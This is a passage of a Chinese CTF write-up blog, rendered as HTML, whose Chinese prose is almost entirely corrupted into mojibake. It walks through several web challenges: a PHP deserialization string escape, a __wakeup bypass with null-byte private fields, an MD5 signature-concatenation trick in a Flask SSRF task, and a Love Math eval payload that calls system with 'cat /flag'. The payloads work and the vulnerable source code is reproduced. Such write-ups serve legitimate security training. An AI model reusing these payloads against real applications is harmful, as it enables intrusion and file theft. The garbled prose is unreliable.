class="string">åé¢&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;<span class="string">&quot;è¿™éƒ¨åˆ†è¢«èˆå¼ƒ</span></span><br><span class="line"><span class="string">è¿™é‡Œæœ€åé¢åŠ ä¸Šçš„s:2:&quot;</span>dd<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;æ˜¯ä¸ºäº†æ»¡è¶³æœ€å‰é¢a:3:ä¸­çš„3</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå‘ç°åœ¨å¦ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åæ”¹ä¸‹åå­—ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><h1 id="0x2D-æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#0x2D-æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="0x2D.[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>0x2D.[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1><blockquote><p>  è€ƒç‚¹è¿˜æ˜¯ååºåˆ—åŒ–</p></blockquote><p>ä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œå®¡è®¡ï¼š</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">index.php:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“username===â€adminâ€æ—¶å¯ä»¥æ‹¿åˆ°flagã€‚</p><p>å¾—åˆ°ï¼š<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></p><p>ååºåˆ—åŒ–çš„æ—¶å€™ä¼šé¦–å…ˆæ‰§è¡Œ<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥è¦è·³è¿‡<code>__wakeup()</code>å»æ‰§è¡Œ<code>__destruct()</code></p><p>åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œå±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡ __wakeup()å‡½æ•°çš„æ‰§è¡Œã€‚</p><p>å› æ­¤ï¼š<code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></p><p>private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦</p><p>å› æ­¤ï¼š<code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p><h1 id="0x2E-De1CTF-2019-SSRF-Me"><a href="#0x2E-De1CTF-2019-SSRF-Me" class="headerlink" title="0x2E.[De1CTF 2019]SSRF Me"></a>0x2E.[De1CTF 2019]SSRF Me</h1><p>æç¤ºè¯´flagåœ¨./flag.txtä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>  urllib.unquote æ˜¯urlè§£ç    </p><p>  urlib.urlencode æ˜¯urlç¼–ç   </p><p>  request.args.getè·å–å•ä¸ªå€¼</p></blockquote><p>geneSigné¡µé¢ï¼šä¼ paramå‚æ•°ç„¶åè¿”å›getSign()å‡½æ•°ã€‚</p><p>De1taé¡µé¢ï¼šä¼ actionå’Œsignä¸¤ä¸ªcookieï¼Œè¿˜æœ‰ä¸€ä¸ªgetçš„paramï¼Œç„¶åç»•wafï¼Œwafä¸»è¦æ˜¯è¿‡æ»¤äº†ä¸¤æ®µçš„ç©ºæ ¼ï¼Œè½¬å°å†™ï¼Œç„¶åä¸èƒ½ä½¿ç”¨gopherå’Œfileä¸¤ä¸ªä¼ªåè®®ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>éœ€è¦ï¼š<code>secert_key + flag.txtrand + scan</code></p><p>æ„é€ <code>/geneSign?param=flag.txtread</code>å¾—åˆ°cookieï¼š<code>0dd168cd293d52dfc3908caa3847a57d</code></p><p>ç„¶åè®¿é—®<code>De1ta</code>é¡µé¢ï¼š</p><p><code>Cookie: action=readscan;sign=0dd168cd293d52dfc3908caa3847a57d</code></p><p>æ‹¿åˆ°flag</p><h1 id="0x2F-CISCN-2019-åˆèµ›-Love-Math"><a href="#0x2F-CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="0x2F.[CISCN 2019 åˆèµ›]Love Math"></a>0x2F.[CISCN 2019 åˆèµ›]Love Math</h1><blockquote><p>  çŸ¥è¯†ç‚¹ï¼š</p><p>  <strong>PHPå‡½æ•°ï¼š</strong></p><p>  scandir() å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br>  base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚<br>  dechex() å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚<br>  hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚<br>  var_dump() ï¼šå‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚<br>  readfile() å‡½æ•°ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚æ‚¨å¯ä»¥é€šè¿‡ @readfile() å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚<br>  è¯­æ³•ï¼šreadfile(filename,include_path,context)</p><p>  <strong>åŠ¨æ€å‡½æ•°</strong></p><p>  phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ä¾‹å¦‚ï¼š$function = â€œsayHelloâ€;$function();</p><p>  <strong>phpä¸­å‡½æ•°åé»˜è®¤ä¸ºå­—ç¬¦ä¸²</strong></p><p>  ä¾‹å¦‚æœ¬é¢˜ç™½åå•ä¸­çš„asinhå’Œpiå¯ä»¥ç›´æ¥å¼‚æˆ–ï¼Œè¿™å°±å¢åŠ äº†æ„é€ å­—ç¬¦çš„é€‰æ‹©</p></blockquote><p>å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç§payloadæ„é€ æ–¹æ³•ï¼š<code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">&quot;hex2bin&quot;</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">&quot;5f474554&quot;</span></span><br><span class="line"><span 